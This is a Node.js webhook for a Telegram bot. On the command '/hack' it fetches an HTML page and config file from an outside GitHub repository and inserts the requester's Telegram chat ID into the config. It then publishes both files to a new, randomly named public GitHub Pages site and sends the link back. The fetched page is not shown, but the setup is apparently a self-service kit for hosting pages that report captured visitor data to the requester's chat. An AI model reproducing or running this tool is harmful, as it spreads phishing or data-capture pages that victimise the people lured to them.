const TelegramBot = require("node-telegram-bot-api");
const { Octokit } = require("@octokit/rest");
const axios = require("axios");

// Setup for bot and GitHub credentials
const botToken = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(botToken, { polling: false });

const githubToken = process.env.GITHUB_TOKEN;
const githubUsername = process.env.GITHUB_USERNAME;

const octokit = new Octokit({ auth: githubToken });

// Webhook endpoint for Telegram bot
module.exports = async (req, res) => {
  if (req.method === "POST") {
    const msg = req.body;
    const chatId = msg.chat.id;

    try {
      if (msg.text === "/hack") {
        const [indexHtmlResponse, configJsResponse] = await Promise.all([
          axios.get("https://raw.githubusercontent.com/DEXTER-ID-NEW/Ashodow-a-pattio/refs/heads/gh-pages/index.html"),
          axios.get("https://raw.githubusercontent.com/DEXTER-ID-NEW/Ashodow-a-pattio/refs/heads/gh-pages/config.js"),
        ]);

        const indexContent = indexHtmlResponse.data;
        let configContent = configJsResponse.data;

        // Replace chatId in config.js
        configContent = configContent.replace(/chatId: "\d+"/, `chatId: "${chatId}"`);

        // Create a random GitHub repo name
        const repoName = `DEXTER_ID_${Math.random().toString(36).substring(2, 7)}${Date.now().toString(36).substring(5, 10)}`;

        // Create the repo
        await octokit.repos.createForAuthenticatedUser({
          name: repoName,
          private: false,
        });

        const files = [
          { path: "index.html", content: indexContent },
          { path: "config.js", content: configContent },
        ];

        for (const file of files) {
          await octokit.repos.createOrUpdateFileContents({
            owner: githubUsername,
            repo: repoName,
            path: file.path,
            message: `Added ${file.path}`,
            content: Buffer.from(file.content).toString("base64"),
          });
        }

        const githubPageUrl = `https://${githubUsername}.github.io/${repoName}/index.html`;
        bot.sendMessage(chatId, `Files uploaded successfully!\nGitHub Page: ${githubPageUrl}`);

        res.status(200).send("OK");
      } else {
        res.status(200).send("Invalid command.");
      }
    } catch (error) {
      console.error("Error:", error);
      res.status(500).send("An error occurred while processing the command.");
    }
  } else {
    res.status(405).send("Method Not Allowed");
  }
};
